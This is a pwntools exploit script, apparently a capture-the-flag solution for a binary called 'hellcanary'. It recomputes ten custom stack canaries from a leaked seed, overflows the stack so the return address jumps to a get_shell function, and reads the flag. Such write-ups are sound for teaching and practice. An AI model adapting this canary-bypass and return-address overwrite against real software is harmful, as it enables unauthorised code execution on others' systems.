#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from pwn import ror

exe = context.binary = ELF('hellcanary')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x401568
b *0x40138E
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


MASK64 = 0xffffffffffffffff
MASK32 = 0xffffffff

def u64(x):
    return x & MASK64

def __ROR8__(x, r):

    return ror(x, r, 64)

def calculate_key(a1, a2):
    a1 = u64(a1)

    if a2 == 0:
        result = (u64(0xFFFFFFFF21524110 - a1) & a2) | (u64(a1 + 0xDEADBEEF) & ~a2)
        result = u64(result - 0x1337)

    elif a2 == 1:
        result = a1 ^ (a2 + (a1 ^ 0xCAFEBABE))

    elif a2 == 2:
        result = u64((8 * a1) | 0xFACEFEED) - a2

    elif a2 == 3:
        result = (u64(a1 * a1) ^ 0x43214321) + a2

    elif a2 == 4:
        result = ( (a1 - a2) & 0x12345678 ) | ( (a2 - a1 - 1) & 0xFFFFFFFFEDCBA987 )

    elif a2 == 5:
        result = (((a2 << 8) & ~a1) | (a1 & u64(~(a2 << 8)))) + 2748

    elif a2 == 6:
        result = __ROR8__(a1, 4) ^ 0xBEEF

    elif a2 == 7:
        result = (a2 & ~u64(123 * a1)) | (u64(123 * a1) & ~a2)

    elif a2 == 8:
        result = (~a1 & MASK32) + a2

    elif a2 == 9:
        result = (((a2 + a1) & MASK64) ^ 0x77777777) - a1
        result &= MASK64
    else:
        return 0

    return u64(result)


def solve():

    io.recvuntil(b"Seed: ")
    seed = int(io.recvline(), 16)
    info("seed: %#x", seed)

    data1 = calculate_key(seed, 0)
    data2 = calculate_key(seed, 0)

    pad_sizes = [32, 56, 16, 64, 24, 40, 48, 16, 32, 56]
    keys = []
    payload = b""

    for i in range(10):
        m = calculate_key(seed, i)
        keys.append(m)

    for i, j in zip(pad_sizes, keys):
        payload += b"A"*i
        payload += p64(j)

    payload += cyclic(620-4
                      )
    payload += p64(exe.sym["get_shell"])

    io.sendafter("...", payload)
    io.sendline(b"cat flag")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

